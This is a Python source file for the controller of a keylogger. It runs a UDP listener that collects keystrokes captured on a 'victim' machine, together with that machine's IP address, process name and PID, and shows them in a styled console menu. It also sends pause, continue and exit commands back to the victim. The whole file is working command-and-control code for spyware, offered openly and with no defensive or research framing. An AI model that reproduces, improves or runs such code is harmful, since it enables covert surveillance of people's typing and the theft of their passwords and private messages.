"""
@author: Vuong Van Duy
controller.py
data: 14.10.2025

This script implements a controller that can send UDP commands to start and stop a keylogger.
It also listens for incoming UDP messages from the keylogger to display captured keystrokes.
The controller runs a listener in a separate thread and allows user input to control the keylogger.
"""

import socket, os
import json
import threading
from typing import Optional
from pynput.keyboard import Listener, Key

line = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
banner = """
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀         ┃    
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘         ┃
┃  ⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀         ┃
┃  ⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸         ┃
┃  ⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇         ┃
┃  ⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃         ┃
┃  ⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀         ┃
┃  ⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         ┃"""


class ConsoleMenu:
    def __init__(self):
        self.appname = "★彡━━━━━★ W E L C O M E  T O  K E Y L O G G E R ★━━━━━彡★"
        self.pause_continue = {"Pause": "Pause", "Continue": "Continue"}
        self.options = [
            "Reset",
            f"{self.pause_continue['Pause']}", # Continue
            "Exit"
        ]
        # self.controller = None
        self.current_selection = 0

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def base_menu(self):
        menu_width = len(self.appname) + 6

        print()
        print("\033[32m" + banner + "\033[0m")
        print("\033[32m" + "┣" + "━" * menu_width + "┫" + "\033[0m")
        print("\033[32m" + "┃  " + self.appname + "  ┃" + "\033[0m")
        print("\033[32m" + "┣" + "━" * menu_width + "┫" + "\033[0m")

        for i, option in enumerate(self.options):
            prefix = "-> " if i == self.current_selection else "   "
            option_text = f"{prefix}{option}"
            spaces = menu_width - len(option_text)
            print("\033[32m" + f"┃{option_text}{' ' * spaces}┃" + "\033[0m")

        print("\033[32m" + "┣" + "━" * menu_width + "┫" + "\033[0m")
        footer = "↑↓ Переключить пункт • Enter Подтвердить"
        padding = (menu_width - len(footer)) // 2
        print("\033[32m" + "┃" + " " * padding + footer + " " * padding + " ┃" + "\033[0m")
        print("\033[32m" + "┗" + "━" * menu_width + "┛" + "\033[0m")

    def draw_console(self, ip_victim=None, info_payload=None, info_victim=None, buffer=None):
        self.base_menu()
        if info_victim:
            print("\033[32m" + info_victim + "\033[0m")
        if ip_victim and info_payload:
            print("\033[32m" + f"Signal is monitored and sent from process {info_payload['process_name']} (PID: {info_payload['pid']}) "
                    f"from ip address: {ip_victim}" + "\033[0m")
        else:
            print("\033[32m" + "No active victim connected." + "\033[0m")
        if buffer == "[KEYLOGGER STOPPED]":
            # in với màu đỏ nếu keylogger đã dừng
            print()
            print("\033[31m" + "★彡━━━━━★ [K E Y L O G G E R ★ S T O P P E D ] ★━━━━━彡★" + "\033[0m")
        else:
            print("\033[32m" + "Keystroke operation ->", buffer, "\033[0m")


class ControllerServer:
    def __init__(self, consoleMenu: ConsoleMenu, ip_victim: Optional[str] = None, port_listen: int = 9999, port_send: int = 9998):
        self.consoleMenu = consoleMenu
        self.ip_victim = ip_victim
        self.port_listen = port_listen
        self.port_send = port_send
        self.running = True
        self.buffer = ""
        self.info_victim = ""
        self.info_payload: dict = {}

    def send_command(self, message: str, timeout: float = 2.0):

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(timeout)
            try:
                request = {
                    "command": message
                }
                sent = sock.sendto(json.dumps(request).encode(), (self.ip_victim, self.port_send))
                print(f"Sent {sent} bytes to {self.ip_victim}:{self.port_send}")
            except socket.timeout:
                pass
            except Exception as e:
                pass

    def execute_selection(self):
        option = self.consoleMenu.current_selection
        print(f"\nВыбранная опция: {self.consoleMenu.options[option]}")

        if option == 0:
            self.buffer = ""
        if option == 1:
            if self.consoleMenu.options[1] == "Pause":
                self.consoleMenu.options[1] = f"{self.consoleMenu.pause_continue['Continue']}"
                self.send_command("pause")
                self.info_payload = {}
                self.ip_victim = None
            else:
                self.consoleMenu.options[1] = f"{self.consoleMenu.pause_continue['Pause']}"
                self.send_command("continue")
        if option == 2:
            self.send_command("exit")
            self.running = False

    def show_console(self):
        self.consoleMenu.clear_screen()
        self.consoleMenu.draw_console(info_victim=self.info_victim,
                                      buffer=self.buffer,
                                      ip_victim=self.ip_victim,
                                      info_payload=self.info_payload)

    def on_press(self, key):
        try:
            if key == Key.up:
                self.consoleMenu.current_selection = (self.consoleMenu.current_selection - 1) % len(self.consoleMenu.options)
            elif key == Key.down:
                self.consoleMenu.current_selection = (self.consoleMenu.current_selection + 1) % len(self.consoleMenu.options)
            elif key == Key.enter:
                self.execute_selection()
            self.show_console()
        except AttributeError:
            pass

    def on_release(self, key):
        try:
            if key == Key.esc or not self.running:
                self.running = False
                return False
        except AttributeError:
            pass

    def start_monitor(self):
        self.show_console()
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def listen_clients(self, buffer_size: int = 8192):
        start_monitor_thread = threading.Thread(target=self.start_monitor)
        start_monitor_thread.start()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.port_listen))
        sock.settimeout(2)

        try:
            while self.running:
                try:
                    data, _ = sock.recvfrom(buffer_size)
                    data = json.loads(data.decode())
                    data_str = data.get("message", "")
                    signal = data.get("signal", False)
                    ip_victim = data.get("from_ip", None)
                    info_payload = data.get("info_payload", {})

                    if (self.ip_victim != ip_victim
                            or self.info_payload != info_payload):
                        self.ip_victim = ip_victim
                        self.info_payload = info_payload
                        self.info_victim = data_str
                        self.send_command(message="Server_active")
                        if self.consoleMenu.options[1] == "continue":
                            self.consoleMenu.options[1] = f"{self.consoleMenu.pause_continue['Pause']}"
                        self.show_console()
                        continue

                    if signal:
                        self.buffer += data_str
                        self.show_console()
                    else:
                        self.buffer = data_str
                        self.info_victim = ""
                        self.show_console()
                        self.buffer = ""
                except socket.timeout as e:
                    continue
                except json.JSONDecodeError as e:
                    pass
                except OSError as e:
                    print("Socket error:", e)
                    break
        except KeyboardInterrupt:
            print("\nReceived Ctrl+C — shutting down server gracefully.")
        finally:
            sock.close()
            if start_monitor_thread.is_alive():
                start_monitor_thread.join()
            print("Socket closed. Bye.")


def main():
    menu = ConsoleMenu()
    controller = ControllerServer(consoleMenu=menu)
    controller.listen_clients()

if __name__ == "__main__":
    main()
